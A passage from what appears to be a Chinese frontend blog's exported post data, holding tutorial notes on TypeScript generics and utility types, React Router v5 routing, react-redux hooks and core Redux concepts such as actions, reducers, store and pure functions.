Type[]): Type[] &#123; // 可以正确访问 console.log(value.length); return value;&#125; 添加泛型约束1234567891011// 创建一个自定义类型interface ILength &#123; length: number;&#125;// Type extends ILength 添加泛型约束// 解释：表示传入的类型必须满足 ILength 接口的要求才行，也就是得有一个 number 类型的 length 属性function id&lt;Type extends ILength&gt;(value: Type): Type &#123; console.log(value.length); return value;&#125; 解释: 创建描述约束的接口 ILength，该接口要求提供 length 属性 通过 extends 关键字来为泛型（类型变量）添加约束 该约束表示：传入的类型必须具有 length 属性 注意：传入的实参（比如，数组）只要有 length 属性即可（类型兼容性) 多个类型变量的泛型泛型的类型变量可以有多个，并且类型变量之间还可以约束(比如，第二个类型变量受第一个类型变量约束) 比如，创建一个函数来获取对象中属性的值： 1234567function getProp&lt;Type, Key extends keyof Type&gt;(obj: Type, key: Key) &#123; return obj[key];&#125;let person = &#123; name: 'jack', age: 18 &#125;;getProp(person, 'name'); 解释: 添加了第二个类型变量 Key，两个类型变量之间使用 , 逗号分隔。 keyof 关键字接收一个对象类型，生成其键名称(可能是字符串或数字)的联合类型。 本示例中 keyof Type 实际上获取的是 person 对象所有键的联合类型，也就是：&#39;name&#39; | &#39;age&#39; 类型变量 Key 受 Type 约束，可以理解为：Key 只能是 Type 所有键中的任意一个，或者说只能访问对象中存在的属性 12345678// Type extends object 表示： Type 应该是一个对象类型，如果不是 对象 类型，就会报错// 如果要用到 对象 类型，应该用 object ，而不是 Objectfunction getProperty&lt;Type extends object, Key extends keyof Type&gt;( obj: Type, key: Key,) &#123; return obj[key];&#125; 泛型接口泛型接口：接口也可以配合泛型来使用，以增加其灵活性，增强其复用性 1234567891011121314interface IdFunc&lt;Type&gt; &#123; id: (value: Type) =&gt; Type; ids: () =&gt; Type[];&#125;let obj: IdFunc&lt;number&gt; = &#123; id(value) &#123; return value; &#125;, ids() &#123; return [1, 3, 5]; &#125;,&#125;; 解释： 在接口名称的后面添加 &lt;类型变量&gt;，那么，这个接口就变成了泛型接口。 接口的类型变量，对接口中所有其他成员可见，也就是接口中所有成员都可以使用类型变量。 使用泛型接口时，需要显式指定具体的类型(比如，此处的 IdFunc)。 此时，id 方法的参数和返回值类型都是 number;ids 方法的返回值类型是 number[]。 实际上，JS 中的数组在 TS 中就是一个泛型接口 12345678const strs = ['a', 'b', 'c'];// 鼠标放在 forEach 上查看类型strs.forEach;const nums = [1, 3, 5];// 鼠标放在 forEach 上查看类型nums.forEach; 解释:当我们在使用数组时，TS 会根据数组的不同类型，来自动将类型变量设置为相应的类型 技巧:可以通过 Ctrl + 鼠标左键(Mac：Command + 鼠标左键)来查看具体的类型信息 泛型工具类型泛型工具类型：TS 内置了一些常用的工具类型，来简化 TS 中的一些常见操作 说明：它们都是基于泛型实现的(泛型适用于多种类型，更加通用)，并且是内置的，可以直接在代码中使用。 这些工具类型有很多，主要学习以下几个: Partial&lt;Type&gt; Readonly&lt;Type&gt; Pick&lt;Type, Keys&gt; TS 所有内置的泛型工具类型文档 Partial Partial 用来构造(创建)一个类型，将 Type 的所有属性设置为可选。 123456type Props = &#123; id: string; children: number[];&#125;;type PartialProps = Partial&lt;Props&gt;; 解释:构造出来的新类型 PartialProps 结构和 Props 相同，但所有属性都变为可选的。 Readonly Readonly 用来构造一个类型，将 Type 的所有属性都设置为 readonly(只读)。 123456type Props = &#123; id: string; children: number[];&#125;;type ReadonlyProps = Readonly&lt;Props&gt;; 解释:构造出来的新类型 ReadonlyProps 结构和 Props 相同，但所有属性都变为只读的。 123let props: ReadonlyProps = &#123; id: '1', children: [] &#125;;// 错误演示props.id = '2'; 当我们想重新给 id 属性赋值时，就会报错:无法分配到 “id” ，因为它是只读属性。 Pick Pick 从 Type 中选择一组属性来构造新类型。 123456interface Props &#123; id: string; title: string; children: number[];&#125;type PickProps = Pick&lt;Props, 'id' | 'title'&gt;; 解释: Pick 工具类型有两个类型变量:1 表示选择谁的属性 2 表示选择哪几个属性。 其中第二个类型变量，如果只选择一个则只传入该属性名即可，如果有多个使用联合类型即可。 第二个类型变量传入的属性只能是第一个类型变量中存在的属性。 构造出来的新类型 PickProps，只有 id 和 title 两个属性类型。","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"TypeScript","slug":"TypeScript","permalink":"//www.shen.ee/tags/TypeScript/"},{"name":"ts","slug":"ts","permalink":"//www.shen.ee/tags/ts/"},{"name":"TypeScript高级类型","slug":"TypeScript高级类型","permalink":"//www.shen.ee/tags/TypeScript高级类型/"},{"name":"ts泛型","slug":"ts泛型","permalink":"//www.shen.ee/tags/ts泛型/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"React系列学习教程合集","slug":"React系列学习教程合集","date":"2022-06-15T04:38:39.000Z","updated":"2022-06-22T06:24:25.997Z","comments":true,"path":"article/16686.html","link":"","permalink":"//www.shen.ee/article/16686.html","excerpt":"","text":"算是一个简单的系列合集笔记记录，温度而知新 React快速上手 JSX语法学习 React组件基础 React组件通讯 React组件进阶及生命周期 深入浅出Hooks Redux状态管理工具学习 react-redux学习 React路由","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"React","slug":"React","permalink":"//www.shen.ee/tags/React/"},{"name":"React学习","slug":"React学习","permalink":"//www.shen.ee/tags/React学习/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"React路由","slug":"React路由","date":"2022-06-15T04:38:39.000Z","updated":"2022-06-22T06:24:26.002Z","comments":true,"path":"article/6674.html","link":"","permalink":"//www.shen.ee/article/6674.html","excerpt":"","text":"React路由-基本使用 这里使用最广泛的 v5 版本，v5 文档、 v5 中文文档 注意：v6 版本相比 v5 版本有破坏性更新！ v6 文档 步骤： 安装：yarn add react-router-dom@5.3.0 导入路由的三个核心组件：Router / Route / Link 使用 Router 组件包裹整个应用 使用 Link 组件作为导航菜单（路由入口） 使用 Route 组件配置路由规则和要展示的组件（路由出口） 123456789101112131415161718192021222324252627import &#123; BrowserRouter as Router, Route, Link &#125; from 'react-router-dom'const First = () =&gt; &lt;p&gt;页面一的页面内容&lt;/p&gt;const App = () =&gt; &#123; return ( &lt;Router&gt; &lt;div className=\"App\"&gt; &lt;ul&gt; &lt;li&gt; &#123;/* to属性：浏览器地址栏中的pathname（location.pathname） */&#125; &lt;Link to=\"/first\"&gt;页面一&lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; &#123;/* path属性：路由规则 component属性：展示的组件 Route 组件写在哪，渲染出来的组件就展示在哪 */&#125; &lt;Route path=\"/first\" component=&#123;First&#125;&gt;&lt;/Route&gt; &lt;/div&gt; &lt;/Router&gt; )&#125; React路由-Router模式 Router 组件：包裹整个应用，一个 React 应用只需要使用一次 两种常用 Router：HashRouter 和 BrowserRouter HashRouter：使用 URL 的哈希值实现（ http://localhost:3000/#/first） 原理：监听 window 的 hashchange 事件来实现的 （推荐） BrowserRouter ：使用 H5 的 history.pushState() API 实现（ http://localhost:3000/first） 原理：监听 window 的 popstate 事件来实现的 React路由-Link&amp;NavLink组件Link 组件：用于指定导航链接，会渲染成 a 标签 to 属性，将来会渲染成 a 标签的 href 属性 12345&lt;Link to=\"/first\"&gt;页面一&lt;/Link&gt;// 渲染为：&lt;a href=\"/first\"&gt;页面一&lt;/a&gt; 除了 Link 组件外，路由库中还提供了 NavLink 组件，可以在路由匹配时获得一个高亮类名，从而指定高亮效果（样式需要自己手动指定） 使用方式同 Link 组件，只是额外获得一个高亮类名 activeClassName 属性：用于指定高亮的类名，默认 active exact属性：精确匹配，表示必须精确匹配（to 属性值和浏览器地址栏中的 pathname 相同），类名才生效 默认情况下，React 路由中的 NavLink 的 to 属性在匹配的时候，默认是 模糊匹配 模糊匹配，表示：只要 浏览器地址栏中的 patchname（比如：/search/a）是以 NavLink to（/search） 属性的值开头的，此时，就会匹配成功 123456789101112131415161718192021222324&lt;NavLink to=\"/first\"&gt;页面一&lt;/NavLink&gt;// 渲染为：&lt;a href=\"/first\" class=\"active\"&gt;页面一&lt;/a&gt;// ---// Link 的模糊匹配和精确匹配// 模糊匹配：// 浏览器地址栏中的 pathname 为：/search/a// 匹配成功的 to 属性为：// 1 /search ==&gt; 模糊匹配成功// 2 /search/a ==&gt; 完全相同，匹配成功// 3 /sear ==&gt; 匹配失败，因为 /search 是一块完整的内容，必须要出现这一整块内容才可以// 精确匹配：// 浏览器地址栏中的 pathname 为：/search/a// 注意：添加 exact 属性后，变为精确匹配，此时，这个 NavLink 只能匹配 /search 这一个 patchname 了// React 中如果属性是 布尔值 可以只写属性名称，不用写后面的 = 等内容&lt;NavLink exact to=\"/search\"&gt;search 页面&lt;/NavLink&gt;// 等价于：&lt;NavLink exact=&#123;true&#125; to=\"/search\"&gt;search 页面&lt;/NavLink&gt; React路由-Route组件Route 组件：用来配置路由规则 path 属性，指定路由规则 component 属性，指定要渲染的组件 children 子节点，指定要渲染的组件 1234567// 用法一：使用 component 属性指定要渲染的组件&lt;Route path=\"/search\" component=&#123;Search&#125; /&gt;// 用法二：使用 children 指定要渲染的组件&lt;Route path=\"/search\"&gt; &lt;Search /&gt;&lt;/Route&gt; 注意：对于 Route 来说，如果路由规则匹配成功，那么，就会渲染对应组件；否则，渲染 null 或者说不渲染任何内容 对于 Route 组件来说，path 属性是可选的： 如果 Route 组件没有 path 属性，表示：该路由永远匹配成功，一定会渲染该组件 123&lt;Route&gt; &lt;SomeComponent /&gt;&lt;/Route&gt; React路由-路由匹配模式路由有两种匹配模式：1 模糊匹配（默认）, 2 精确匹配 模糊匹配 问题：当 Link组件的 to 属性值为 “/login”时，为什么 默认路由 也被匹配成功? 默认情况下，React 路由是模糊匹配模式 模糊匹配规则：只要 pathname（浏览器地址栏中的地址） 以 path 开头就会匹配成功 12345&lt;Link to=\"/login\"&gt;登录页面&lt;/Link&gt;&lt;Route path=\"/\" component=&#123;Home&#125; /&gt; 匹配成功// pathname 代表Link组件的to属性（也就是 location.pathname）// path 代表Route组件的path属性 path 能够匹配的pathname（浏览器地址栏） / 所有 pathname /first /first 或 /first/a 或 /first/a/b/… 精确匹配 问题：默认路由任何情况下都会展示，如何避免这种问题? 给 Route 组件添加 exact 属性，让其变为精确匹配模式 精确匹配：只有当 path 和 pathname 完全匹配时才会展示该路由 12// 此时，该组件只能匹配 pathname=“/” 这一种情况 &lt;Route exact path=\"/\" component=... /&gt; React路由-执行过程切换页面时，执行过程如下： 点击 Link 组件（a标签），修改了浏览器地址栏中的 url React 路由监听到地址栏 url 的变化 hashchange popstate React 路由内部遍历所有 Route 组件，使用路由规则（path）与 pathname（hash）进行匹配 当路由规则（path）能够匹配地址栏中的 pathname（hash） 时，就展示该 Route 组件的内容 注意：默认情况下，React 路由可以同时匹配成功多个，只要匹配成功，该路由组件对应的内容就会渲染到页面中 React路由-Switch组件&amp;404页面Switch 组件：包裹 Route 组件，只会渲染第一个匹配的组件，即使有多个路由都可以匹配成功 在实际开发时，通常会用 Switch 组件包裹 Route 组件 通过 Switch 组件非常容易的就能实现 404 页面功能： 123456789101112131415161718192021&lt;Switch&gt; &lt;Route exact path=\"/\"&gt; &lt;Home /&gt; &lt;/Route&gt; &lt;Route path=\"/about\"&gt; &lt;About /&gt; &lt;/Route&gt; &lt;Route path=\"/user\"&gt; &lt;User /&gt; &lt;/Route&gt; // 即使这个也可以匹配成功 /user/a 但是因为 Switch 组件的存在，这个路由对应的组件内容是不会渲染的 &lt;Route path=\"/user/a\"&gt; &lt;User1 /&gt; &lt;/Route&gt; &#123;/* 以上路由规则全都不匹配时，展示 404 页面 */&#125; &#123;/* 注意：这个路由需要放在最后，兜底 */&#125; &lt;Route&gt; &lt;NoMatch /&gt; &lt;/Route&gt;&lt;/Switch&gt; React路由-编程式导航 场景：点击登录按钮，登录成功后，通过代码跳转到后台首页，如何实现？ 编程式导航：通过 JS 代码来实现页面跳转 可以通过useHistoryhook 来拿到路由提供的 history 对象，用于获取浏览器历史记录的相关信息。常用操作： push(path)：跳转到某个页面，参数 path 表示要跳转的路径 replace(patch)：跳转到某个页面，会替换当前的历史记录 go(n)： 前进或后退到某个页面，参数 n 表示前进或后退页面数量（比如：-1 表示后退到上一页） 12345678910111213import &#123; useHistory &#125; from 'react-router-dom'const Login = () =&gt; &#123; const history = useHistory() const onLogin = () =&gt; &#123; // ... history.push('/home') &#125; return ( &lt;button onClick=&#123;onLogin&#125;&gt;登录&lt;/button&gt; )&#125; push(path)和 replace(path) 跳转路由的区别： 浏览器会自动记录访问过来的页面路径，可以简单的把理解为通过一个 数组 来记录的。 比如：我们访问了 3 个页面：[‘/login’, ‘/home’, ‘/search’]，当前所在页面为：’/search’ 此时，如果我们又通过 push(&#39;/a&#39;) 方法访问了一个新页面：’/a’，此时，就相当于往数组中 push 了一条数据， 那么，访问该页面后，浏览器中的记录为：[‘/login’, ‘/home’, ‘/search’, ‘/a’] 此时，如果我们又通过 replace(&#39;/a&#39;) 方法访问了一个新页面：’/a’，此时，就相当于把当前页面地址，替换为 ‘/a’ 那么，访问该页面后，浏览器中的记录为：[‘/login’, ‘/home’, ‘/a’]","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"React路由","slug":"React路由","permalink":"//www.shen.ee/tags/React路由/"},{"name":"react-router-dom","slug":"react-router-dom","permalink":"//www.shen.ee/tags/react-router-dom/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"react-redux学习","slug":"react-redux学习","date":"2022-06-15T04:38:39.000Z","updated":"2022-06-22T06:24:26.008Z","comments":true,"path":"article/57549.html","link":"","permalink":"//www.shen.ee/article/57549.html","excerpt":"","text":"React-Redux介绍为什么要使用 React-Redux 绑定库? React 和 Redux 是两个独立的库，两者之间职责独立。因此，为了实现在 React 中使用 Redux 进行状态管理 ，就需要一种机制，将这两个独立的库关联在一起。这时候就用到 React-Redux 这个绑定库了。 作用：为 React 接入 Redux，实现在 React 中使用 Redux 进行状态管理。 react-redux 库是 Redux 官方提供的 React 绑定库。 基本使用react-redux 文档 react-redux 的使用分为两大步：1 全局配置（只需要配置一次） 2 组件接入（获取状态或修改状态） 先看全局配置： 步骤： 安装 react-redux：yarn add react-redux 从 react-redux 中导入 Provider 组件 导入创建好的 redux 仓库 使用 Provider 包裹整个应用 将导入的 store 设置为 Provider 的 store 属性值 核心代码： src/index.js 中： 12345678910// 导入 Provider 组件import &#123; Provider &#125; from 'react-redux'// 导入创建好的 storeimport store from './store'const root = ReactDOM.createRoot(document.querySelector('#root'))root.render( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt;) 获取状态useSelector useSelector：获取 Redux 提供的状态数据 参数：selector 函数，用于从 Redux 状态中筛选出需要的状态数据并返回 返回值：筛选出的状态 1234567import &#123; useSelector &#125; from 'react-redux'// Redux 中的状态是数值，所以，可以直接返回 state 本身const count = useSelector(state =&gt; state)// 比如，Redux 中的状态是个对象，就可以：const list = useSelector(state =&gt; state.list) 例： 12345678910111213import &#123; useSelector &#125; from 'react-redux'const App = () =&gt; &#123; const count = useSelector(state =&gt; state) return ( &lt;div&gt; &lt;h1&gt;计数器：&#123;count&#125;&lt;/h1&gt; &lt;button&gt;数值增加&lt;/button&gt; &lt;button&gt;数值减少&lt;/button&gt; &lt;/div&gt; )&#125; 分发动作useDispatch useDispatch：拿到 dispatch 函数，分发 action，修改 redux 中的状态数据 语法： 1234567import &#123; useDispatch &#125; from 'react-redux'// 调用 useDispatch hook，拿到 dispatch 函数const dispatch = useDispatch()// 调用 dispatch 传入 action，来分发动作dispatch( action ) 例： 1234567891011121314import &#123; useDispatch &#125; from 'react-redux'const App = () =&gt; &#123; const dispatch = useDispatch() return ( &lt;div&gt; &lt;h1&gt;计数器：&#123;count&#125;&lt;/h1&gt; &#123;/* 调用 dispatch 分发 action */&#125; &lt;button onClick=&#123;() =&gt; dispatch(increment(2))&#125;&gt;数值增加&lt;/button&gt; &lt;button onClick=&#123;() =&gt; dispatch(decrement(5))&#125;&gt;数值减少&lt;/button&gt; &lt;/div&gt; )&#125; 理解 Redux 数据流 任何一个组件都可以直接接入 Redux，也就是可以直接：1 修改 Redux 状态 2 接收 Redux 状态 并且，只要 Redux 中的状态改变了，所有接收该状态的组件都会收到通知，也就是可以获取到最新的 Redux 状态 这样的话，两个组件不管隔得多远，都可以直接通讯了 代码结构在使用 Redux 进行项目开发时，不会将 action/reducer/store 都放在同一个文件中，而是会进行拆分 可以按照以下结构，来组织 Redux 的代码： 1234/store --- 在 src 目录中创建，用于存放 Redux 相关的代码 /actions --- 存放所有的 action /reducers --- 存放所有的 reducer index.js --- redux 的入口文件，用来创建 store ActionType的使用 Action Type 指的是：action 对象中 type 属性的值 Redux 项目中会多次使用 action type，比如，action 对象、reducer 函数、dispatch(action) 等 目标：集中处理 action type，保持项目中 action type 的一致性 action type 的值采用：&#39;domain/action&#39;(功能/动作)形式，进行分类处理，比如， 计数器：&#39;counter/increment&#39; 表示 Counter 功能中的 increment 动作 登录：&#39;login/getCode&#39; 表示登录获取验证码的动作 个人资料：&#39;profile/get&#39; 表示获取个人资料 步骤： 在 store 目录中创建 actionTypes 目录或者 constants 目录，集中处理 创建常量来存储 action type，并导出 将项目中用到 action type 的地方替换为这些常量，从而保持项目中 action type 的一致性 12345678910111213141516171819202122232425262728// actionTypes 或 constants 目录：const increment = 'counter/increment'const decrement = 'counter/decrement'export &#123; increment, decrement &#125;// --// 使用：// actions/index.jsimport * as types from '../acitonTypes'const increment = payload =&gt; (&#123; type: types.increment, payload &#125;)const decrement = payload =&gt; (&#123; type: types.decrement, payload &#125;)// reducers/index.jsimport * as types from '../acitonTypes'const reducer = (state, action) =&gt; &#123; switch (action.type) &#123; case types.increment: return state + 1 case types.decrement: return state - action.payload default: return state &#125;&#125; 注：额外添加 Action Type 会让项目结构变复杂，此操作可省略。但，domain/action 命名方式强烈推荐！ Reducer的分离与合并 随着项目功能变得越来越复杂，需要 Redux 管理的状态也会越来越多 此时，有两种方式来处理状态的更新： 使用一个 reducer：处理项目中所有状态的更新 使用多个 reducer：按照项目功能划分，每个功能使用一个 reducer 来处理该功能的状态更新 推荐：使用多个 reducer（第二种方案），每个 reducer 处理的状态更单一，职责更明确 此时，项目中会有多个 reducer，但是 store 只能接收一个 reducer，因此，需要将多个 reducer 合并为一根 reducer，才能传递给 store 合并方式：使用 Redux 中的 combineReducers 函数 注意： 合并后，Redux 的状态会变为一个对象，对象的结构与 combineReducers 函数的参数结构相同 比如，此时 Redux 状态为：{ a： aReducer 处理的状态, b： bReducer 处理的状态 } 1234567891011121314151617import &#123; combineReducers &#125; from 'redux'// 计数器案例，状态默认值为：0const aReducer = (state = 0, action) =&gt; &#123;&#125;// Todos 案例，状态默认值为：[]const bReducer = (state = [], action) =&gt; &#123;&#125;// 合并多个 reducer 为一个 根reducerconst rootReducer = combineReducers(&#123; a: aReducer, b: bReducer&#125;)// 创建 store 时，传入 根reducerconst store = createStore(rootReducer)// 此时，合并后的 redux 状态： &#123; a: 0, b: [] &#125; 注意：虽然在使用combineReducers以后，整个 Redux 应用的状态变为了对象，但是，对于每个 reducer 来说，每个 reducer 只负责整个状态中的某一个值 也就是：每个reducer只负责自己要处理的状态 举例： 登录功能：loginReducer 处理的状态只应该是跟登录相关的状态 个人资料：profileReducer 处理的状态只应该是跟个人资料相关的状态 合并 reducer 后，redux 处理方式：只要合并了 reducer，不管分发什么 action，所有的 reducer 都会执行一次。各个 reducer 在执行的时候，能处理这个 action 就处理，处理不了就直接返回上一次的状态。所以，我们分发的某一个 action 就只能被某一个 reducer 来处理，也就是最终只会修改这个 reducer 要处理的状态，最终的表现就是：分发了 action，只修改了 redux 中这个 action 对应的状态！ redux管理哪些状态不同状态的处理方式： 将所有的状态全部放到 redux 中，由 redux 管理 只将某些状态数据放在 redux 中，其他数据可以放在组件中，比如： 如果一个状态，只在某个组件中使用（比如，表单项的值），推荐：放在组件中 需要放到 redux 中的状态： 在多个组件中都要使用的数据【涉及组件通讯】 通过 ajax 请求获取到的接口数据【涉及到请求相关逻辑代码放在哪的问题】","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"Redux状态管理工具","slug":"Redux状态管理工具","permalink":"//www.shen.ee/tags/Redux状态管理工具/"},{"name":"状态管理工具","slug":"状态管理工具","permalink":"//www.shen.ee/tags/状态管理工具/"},{"name":"react-redux","slug":"react-redux","permalink":"//www.shen.ee/tags/react-redux/"},{"name":"actionType","slug":"actionType","permalink":"//www.shen.ee/tags/actionType/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"Redux状态管理工具学习","slug":"Redux学习","date":"2022-06-15T03:38:39.000Z","updated":"2022-06-22T06:24:26.004Z","comments":true,"path":"article/57612.html","link":"","permalink":"//www.shen.ee/article/57612.html","excerpt":"","text":"Redux-概念 Redux 是 React 中最常用的状态管理工具（状态容器） 文档： redux 中文文档 redux 英文文档 React的问题： React 只是 DOM 的一个抽象层（UI 库），并不是 Web 应用的完整解决方案。 因此 React 在涉及到数据的处理以及组件之间的通信时会比较复杂 。 对于大型的复杂应用来说，这两方面恰恰是最关键的，需要一个专门的状态工具。 背景介绍： 2014 年 Facebook 提出了 Flux 架构的概念（前端状态管理的概念），引发了很多的实现 2015 年，Redux 出现，将 Flux 与函数式编程结合一起，很短时间内就成为了最热门的前端架构 Flux 是最早的前端的状态管理工具，它提供了状态管理的思想，也提供对应的实现 除了 Flux、Redux 之外，还有：Mobx 等状态管理工具 为什么需要Redux? 不使用 Redux (图左边) ： 只能使用父子组件通讯、状态提升等 React 自带机制 处理远房亲戚(非父子)关系的组件通讯时乏力 组件之间的数据流混乱，出现 Bug 时难定位 使用 Redux (图右边)： 集中式存储和管理应用的状态 处理组件通讯问题时，无视组件之间的层级关系 简化大型复杂应用中组件之间的通讯问题 数据流清晰，易于定位 Bug Redux-核心要素为了让代码各部分职责清晰、明确，Redux 代码被分为三个核心概念：action/reducer/store 三个核心概念的职责分别是什么 action -&gt; reducer -&gt; store action（动作）：描述要做的事情 reducer（函数）：更新状态 store（仓库）：整合 action 和 reducer 类比生活 action：相当于公司中要做的事情，比如软件开发、测试，打扫卫生等 reducer：相当于公司的员工，负责干活的 store：相当于公司的老板 流程：老板(store)分配公司中要做的事情(action)给员工(reducer)，员工干完活把结果交给老板 Redux-核心action action 就是一个对象，type 描述行为，约定 payload做为传参。 解释： action 行动（名词）、动作 描述要做的事情，项目中的每一个功能都是一个 action 例如： 计数器案例：计数器加1、减1 购物车案例：获取购物车数据、切换商品选中状态 项目：登录，退出等 特点： action 只描述做什么事情 action 是一个JS对象，必须带有 type 属性，用于区分动作的类型 根据功能的不同，可以携带额外的数据（比如，payload 有效载荷），配合该动作来完成相应功能 举例： 12345678910111213// 计数器案例&#123; type： 'increment' &#125; // +1&#123; type： 'decrement' &#125; // -1// 累加10操作&#123; type： 'increment', payload: 10 &#125; // +10&#123; type： 'decrement', payload: 10 &#125; // -10// 购物车案例&#123; type: 'getGoodsList' &#125;&#123; type: 'changeGoodsState', payload: &#123; id: 1, goodsState: true &#125; &#125; action creator 使用函数创建 action 对象，简化多次使用 action 时，重复创建 action 对象 举例： 123456789101112131415// 1. 不使用 Action Creator// 创建多个 action 时，需要重复手动创建 action 对象，很繁琐&#123; type: 'decrement', payload: 2 &#125;&#123; type: 'decrement', payload: 8 &#125;// 2. 使用 Action Creatorconst decrement = payload =&gt; &#123; return &#123; type: 'decrement', payload &#125;&#125;decrement(2) // =&gt; &#123; type: 'decrement', payload: 2 &#125;decrement(8) // =&gt; &#123; type: 'decrement', payload: 8 &#125;// 可以动态创建action Redux-核心reducer 名字是参考了 JS 数组中的 reduce 这个方法 数组中的 reduce 方法，可以来实现累计（比如，累加或者累减） 作用： 用来处理 action 并更新状态，是 Redux 状态更新 的地方 函数签名为：(prevState, action) =&gt; newState 接收上一次的状态和 action 作为参数，根据 action 的类型，执行不同操作，最终返回新的状态 原则： 函数一定要有返回值，即使状态没有改变也要返回上一次的状态 reducer 是一个纯函数 不要使用 Math.random() / new Date() / Date.now() / ajax 请求等不纯的操作 reducer 不能执行JS副作用 不要直接修改当前状态，而是根据当前状态值创建新的状态值（新替旧） 123456// 伪代码：// prevState 上一次的状态// action 当前要执行的动作const reducer = (prevState, action) =&gt; &#123; return newState&#125; 示例: 123456789101112131415161718192021// 示例：// state 上一次的状态// action 当前要执行的动作const reducer = (state, action) =&gt; &#123; switch (action.type) &#123; // 计数器增加 case 'increment': // 返回新状态 // return state + 1 // 根据 action 中提供的 payload 来决定到底增加多少 return state + action.payload // 注意：一定要有 default，如果将来 reducer 无法处理某个 action，就直接将上一次的状态返回即可 default: return state &#125;&#125;// 模拟调用reducer(0, &#123; type: 'increment' &#125;) // 本次执行完成后，状态变为：1reducer(1, &#123; type: 'increment' &#125;) // 本次执行完成后，状态变为：2reducer(1, &#123; type: 'decrement' &#125;) // 无法处理该 action，所以返回上一次状态：1 总结： reducer 是修改状态的地方，这里根据action的类型去修改状态 修改的原则：新值替换旧值，不能发请求和随机返回，不能操作全局变量 Redux-核心store 通过store关联action和reducer store：仓库，Redux 的核心，整合 action 和 reducer 特点： 一个应用只有一个 store 维护应用的状态，获取状态：store.getState() 发起状态更新时，需要分发 action：store.dispatch(action) 创建 store 时接收 reducer 作为参数：const store = createStore(reducer) 其他 API， 订阅(监听)状态变化：const unSubscribe = store.subscribe(() =&gt; {}) 取消订阅状态变化： unSubscribe() 核心代码： 123456789101112131415161718192021222324252627// 提前安装 redux import &#123; legacy_createStore as createStore &#125; from 'redux'// 创建 store// 参数为：reducer 函数const store = createStore(reducer)// 更新状态// dispatch 派遣，派出。表示：分发一个 action，也就是发起状态更新store.dispatch(action)store.dispatch( increment(2) )// 获取状态const state = store.getState()// ---// 其他 API// 监听状态变化const unSubscribe = store.subscribe(() =&gt; &#123; // 状态改变时，执行相应操作 // 比如，记录 redux 状态 console.log(store.getState())&#125;)// 取消监听状态变化unSubscribe() Redux-默认值由来 只要创建 store，那么，Redux 就会调用一次 reducer，这一次就是初始化默认值。 第一次调用 reducer reducer(undefined, {type: &quot;@@redux/INITv.a.4.t.t.p&quot;}) 因为传入的状态值是 undefined ，并且是一个随机的 action type，所以： 状态值因为 undefined，所以，我们设置的默认值就会生效 state = 10 因为是一个随机的 action type，那就一定会走 default，返回默认值 10 Redux 内部拿到状态值，就用这个状态值，来作为了 store 中状态的默认值 因此，将来当我们调用 store.getState() 方法来获取 Redux 状态值就是默认值 1234567891011121314151617181920// 导入 createStoreimport &#123; legacy_createStore as createStore &#125; from 'redux'// 创建 storeconst store = createStore(reducer)// action =&gt; &#123; type: 'increment' &#125;function reducer(state = 10, action) &#123; console.log('reducer:', state, action) switch (action.type) &#123; case 'increment': return state + 1 default: return state &#125;&#125;store.dispatch(increment())// 相当于：store.dispatch(&#123; type: 'increment' &#125;)console.log('store 状态值为：', store.getState()) Redux-执行过程分析 创建 store 时，Redux 就会先调用一次 reducer，来获取到默认状态 分发动作 store.dispatch(action)更新状态 Redux store 调用 reducer 传入：上一次的状态（当前示例中就是：10）和 action（{ type: &#39;increment&#39; }），计算出新的状态并返回 reducer 执行完毕后，将最新的状态交给 store，store 用最新的状态替换旧状态，状态更新完毕 12345678910111213141516171819202122import &#123; legacy_createStore as createStore &#125; from 'redux'const store = createStore(reducer)// reducer(10, &#123; type: 'increment' &#125;)function reducer(state = 10, action) &#123; console.log('reducer:', state, action) switch (action.type) &#123; case 'increment': return state + 1 default: return state &#125;&#125;console.log('状态值为：', store.getState()) // 10// 发起更新状态：// 参数： action 对象store.dispatch(&#123; type: 'increment' &#125;)// 相当于： reducer(10, &#123; type: 'increment' &#125;)console.log('更新后：', store.getState()) // 11 纯函数&amp;JS副作用纯函数： 纯函数是函数式编程中的概念，对于纯函数来说，相同的输入总是得到相同的输出 参考资料：函数式编程初探 1234567891011121314151617181920212223242526// 纯函数：const add = () =&gt; &#123; return 123&#125;add() // 123add() // 123const add = (num1, num2) =&gt; &#123; return num1 + num2&#125;add(1, 2) // 3add(1, 2) // 3const add = (obj) =&gt; &#123; return obj&#125;add(&#123; name: 'jack' &#125;) // &#123; name: 'jack' &#125;add(&#123; name: 'jack' &#125;) // &#123; name: 'jack' &#125;// 不是纯函数：const add = () =&gt; &#123; return Math.random()&#125;add() // 0.12311293827497123add() // 0.82239841238741814 JS副作用： 如果一个函数或其他操作修改了其局部环境之外的状态变量值，那么它就被称为有副作用 12345678910111213141516171819202122232425// 无副作用const add = (num1, num2) =&gt; &#123; return num1 + num2&#125;add(1, 3)// 有副作用：let c = 0const add = (num1, num2) =&gt; &#123; // 函数外部的环境产生了影响，所以是有副作用的 c = 1 return num1 + num2&#125;add(1, 3)// 有副作用const add = (obj) =&gt; &#123; // 因为直接修改了参数的值，对外部的数据产生了影响 obj.num = 123 return obj&#125;const o = &#123;&#125;add(o)console.log(o) // &#123; num: 123 